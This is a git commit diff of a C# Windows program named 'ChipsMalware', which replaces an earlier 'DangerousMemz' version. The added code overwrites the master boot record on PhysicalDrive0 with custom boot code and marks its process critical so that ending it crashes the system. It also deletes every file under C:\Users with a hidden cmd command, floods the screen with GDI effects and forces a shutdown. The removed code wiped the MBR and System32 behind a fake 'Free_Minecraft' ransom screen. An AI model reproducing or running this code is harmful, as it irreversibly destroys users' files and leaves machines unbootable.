40e9d3bde6e43ddbb2bd320feade751f17718e86
xoxojojo <kornelzietek7@gmail.com>
2026-03-26 17:04:54 +0100

    Update Idiot.cs

--- Idiot.cs
+++ Idiot.cs
@@ -4,140 +4,133 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Text;
 using System.IO;
 
-namespace DangerousMemz
+namespace ChipsMalware
 {
-    class Program : Form
+    class Program
     {
-        // --- API WINDOWS ---
-        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
-        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
+        // --- API IMPORT ---
         [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
-        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
         [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
+        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int xS, int yS, uint r);
+        [DllImport("gdi32.dll")] static extern uint SetPixel(IntPtr hdc, int x, int y, uint color);
+        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string n, uint a, uint s, IntPtr p, uint c, uint f, IntPtr h);
+        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
+        [DllImport("user32.dll")] static extern bool SetProcessDefaultLayout(uint dw);
         [DllImport("user32.dll")] static extern int GetSystemMetrics(int n);
-        [DllImport("user32.dll")] static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
+        [DllImport("kernel32.dll")] static extern bool Beep(uint f, uint d);
 
-        private int timeLeft = 600; 
-        private Label lblTimer;
-        private TextBox txtKey;
-        private static bool isWatcher = false;
-        private static Random rnd = new Random();
-
-        // Zasoby GDI
-        private static IntPtr iconError = SystemIcons.Error.Handle;
-        private static IntPtr iconWarn = SystemIcons.Warning.Handle;
+        static Random rnd = new Random();
 
         [STAThread]
         static void Main(string[] args)
         {
             Application.EnableVisualStyles();
 
-            // 1. MSGBOXY STARTOWE
-            if (args.Length == 0) {
-                if (MessageBox.Show("Warning: This is a MALWARE. Your PC will be destroyed.\nContinue?", "Free_Minecraft.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
-                if (MessageBox.Show("LAST CHANCE! Your MBR and System32 will be gone.\nAre you really sure?", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
-            }
+            // 1. OSTRZEŻENIA (Standard)
+            if (MessageBox.Show("Warning: Your computer will be destroyed by malware.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) != DialogResult.Yes) return;
+            if (MessageBox.Show("THIS IS YOUR FINAL WARNING...", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop) != DialogResult.Yes) return;
 
-            // 2. WATCHER (DWA PROCESY)
-            if (args.Length > 0 && args[0] == "--watcher") isWatcher = true;
-            else try { Process.Start(Process.GetCurrentProcess().MainModule.FileName, "--watcher"); } catch {}
+            // INSTANT MBR KILL (Cichy zabójca w tle)
+            OverwriteMBR();
 
-            // 3. OCHRONA (BSOD)
-            try { int c = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref c, 4); } catch {}
-            
-            Application.Run(new Program());
+            // Ochrona procesu
+            int crit = 1;
+            try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref crit, 4); } catch { }
+
+            // --- START PROGRESYWNEJ DESTRUKCJI ---
+            Run_Slow_Destruction();
+
+            Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false });
         }
 
-        public Program()
+        static void Run_Slow_Destruction()
         {
-            if (isWatcher) {
-                this.Opacity = 0; this.ShowInTaskbar = false;
-                new Thread(WatcherPayload).Start();
-                return;
-            }
+            new Thread(() => {
+                // FAZA 1: NIEPOKÓJ (Pierwsze 15 sekund)
+                // Drobne dźwięki, rzadkie MsgBoxy, pojedyncze martwe piksele.
+                for (int i = 0; i < 15; i++) {
+                    if (i % 5 == 0) new Thread(() => MessageBox.Show("Chips are coming...", "CHIPS", MessageBoxButtons.OK, MessageBoxIcon.Information)).Start();
+                    Beep((uint)rnd.Next(800, 1200), 100);
+                    Thread.Sleep(1000);
+                }
 
-            // --- INTERFEJS ---
-            this.Text = "Opps, files encrypted";
-            this.Size = new Size(1000, 600);
-            this.StartPosition = FormStartPosition.CenterScreen;
-            this.BackColor = Color.FromArgb(160, 0, 0); 
-            this.FormBorderStyle = FormBorderStyle.None;
-            this.TopMost = true;
+                // FAZA 2: ZAKŁÓCENIA (15-30 sekunda)
+                // Zmiana układu na ARABSKI (RTL), pierwsze śnieżenie (rzadkie).
+                SetProcessDefaultLayout(1); 
+                new Thread(Payload_Snow_Light).Start();
+                Thread.Sleep(15000);
 
-            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 40, FontStyle.Bold), Location = new Point(600, 30), Size = new Size(350, 70), TextAlign = ContentAlignment.MiddleRight, ForeColor = Color.Yellow };
-            txtKey = new TextBox() { Text = "Key.", Font = new Font("Consolas", 12), Location = new Point(50, 435), Size = new Size(380, 30) };
-            
-            Button btnDestroy = new Button() { Text = "Destroy Now", Location = new Point(780, 480), Size = new Size(180, 45), BackColor = Color.Black, ForeColor = Color.White };
-            btnDestroy.Click += (s, e) => {
-                if (MessageBox.Show("Are you sure?", "Confirmation", MessageBoxButtons.YesNo) == DialogResult.Yes) timeLeft = 0;
-            };
+                // FAZA 3: KRUSZENIE (30-50 sekunda)
+                // Wchodzi Tunel i Inwersja kolorów, częstszy spam.
+                new Thread(Payload_Visuals).Start();
+                Thread.Sleep(20000);
 
-            this.Controls.AddRange(new Control[] { lblTimer, txtKey, btnDestroy });
-
-            // TIMER
-            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
-            t.Tick += (s, e) => {
-                if (timeLeft > 0) { timeLeft--; lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); }
-                else { t.Stop(); ExecuteDestruction(); }
-            };
-            t.Start();
+                // FAZA 4: TOTALNY CRUNCH (Finał)
+                // Agresywne kasowanie plików i głośny pisk.
+                Execute_The_Final_Crunch();
+            }).Start();
         }
 
-        // PAYLOAD DLA WATCHERA (Myszka + Drżenie)
-        void WatcherPayload() {
+        static void Payload_Snow_Light()
+        {
             IntPtr hdc = GetDC(IntPtr.Zero);
-            int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
-            while(true) {
-                DrawIcon(hdc, Cursor.Position.X + rnd.Next(-20, 20), Cursor.Position.Y + rnd.Next(-20, 20), rnd.Next(2) == 0 ? iconError : iconWarn);
-                BitBlt(hdc, rnd.Next(-5, 5), rnd.Next(-5, 5), sw, sh, hdc, 0, 0, 0x00CC0020);
+            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+            while (true) {
+                for (int i = 0; i < 100; i++) // Delikatny szum
+                    SetPixel(hdc, rnd.Next(w), rnd.Next(h), (uint)(rnd.Next(2) == 0 ? 0xFFFFFF : 0x000000));
                 Thread.Sleep(10);
             }
         }
 
-        void ExecuteDestruction()
+        static void Payload_Visuals()
         {
-            // 1. MBR & System32 Kill
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+            while (true) {
+                // Wolne "zapadanie się" ekranu (Tunel)
+                BitBlt(hdc, 2, 2, w - 4, h - 4, hdc, 0, 0, 0x00CC0020);
+                if (rnd.Next(100) > 97) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009); // Błysk negatywu
+                Thread.Sleep(30);
+            }
+        }
+
+        static void Execute_The_Final_Crunch()
+        {
+            // Pisk przed śmiercią
+            new Thread(() => { for(int i=0; i<5; i++) Beep(4000, 200); }).Start();
+            
+            // Kasowanie plików
+            Process.Start(new ProcessStartInfo("cmd.exe", "/c del /s /q /f C:\\Users\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
+            
+            // Shutdown
+            Thread.Sleep(5000);
+            Process.Start("shutdown", "-s -t 0 -f -c \"Sorry, this virus can't be turned off. lol\"");
+        }
+
+        static void OverwriteMBR()
+        {
+            byte[] mbr = new byte[512];
+            byte[] bootCode = new byte[] {
+                0xB8, 0x13, 0x00, 0xCD, 0x10, // VGA 13h
+                0xBB, 0x00, 0xA0, 0x8E, 0xC3, // DS -> A000 (Video)
+                0xBE, 0x60, 0x7C,             // Tekst
+                0xB4, 0x0E, 0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, // Pętla tekstu
+                0x31, 0xFF, 0xB8, 0x2C, 0xAA, 0x47, 0x81, 0xFF, 0x40, 0xFA, 0x75, 0xF7, 0xEB, 0xFE // Animacja Chipsa
+            };
+            string msg = "\r\nChips Be Here, the computer was eaten by: Chips\0";
+            byte[] msgBytes = Encoding.ASCII.GetBytes(msg);
+            Array.Copy(bootCode, 0, mbr, 0, bootCode.Length);
+            Array.Copy(msgBytes, 0, mbr, 0x60, msgBytes.Length);
+            mbr[510] = 0x55; mbr[511] = 0xAA;
+
             try {
-                uint w; byte[] mbr = new byte[512]; mbr[510] = 0x55; mbr[511] = 0xAA;
-                IntPtr d = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
-                WriteFile(d, mbr, 512, out w, IntPtr.Zero);
-            } catch {}
-            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & rd /s /q C:\\Windows\\System32") { WindowStyle = ProcessWindowStyle.Hidden });
-
-            // 2. GDI CHAOS (Tunel + Snow + Invert)
-            new Thread(() => {
-                IntPtr hdc = GetDC(IntPtr.Zero);
-                int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
-                while(true) {
-                    // SNOW
-                    BitBlt(hdc, rnd.Next(sw), rnd.Next(sh), rnd.Next(300), rnd.Next(300), hdc, rnd.Next(sw), rnd.Next(sh), 0x00CC0020);
-                    // TUNNEL
-                    BitBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, 0x00CC0020);
-                    // INVERT
-                    if(rnd.Next(15) > 12) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, 0x00550009);
-                    Thread.Sleep(10);
-                }
-            }).Start();
-
-            // 3. TEXT WRITER
-            new Thread(() => {
-                string m = "Your PC have been destroyed by \"Free_Minecraft\". Now enjoy Nyan Cat";
-                IntPtr hdc = GetDC(IntPtr.Zero);
-                using (Graphics g = Graphics.FromHdc(hdc)) {
-                    Font f = new Font("Comic Sans MS", 40, FontStyle.Bold);
-                    for (int i = 0; i <= m.Length; i++) {
-                        g.DrawString(m.Substring(0, i), f, Brushes.Black, 52, 202);
-                        g.DrawString(m.Substring(0, i), f, Brushes.White, 50, 200);
-                        Thread.Sleep(150);
-                    }
-                }
-            }).Start();
-
-            // 4. RESTART
-            Process.Start("shutdown", "/r /t 60 /f /c \"Hohoho! Nyan Cat incoming!\"");
-            this.Invoke((MethodInvoker)delegate { this.Hide(); });
+                uint w;
+                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                WriteFile(h, mbr, 512, out w, IntPtr.Zero);
+            } catch { }
         }
     }
 }
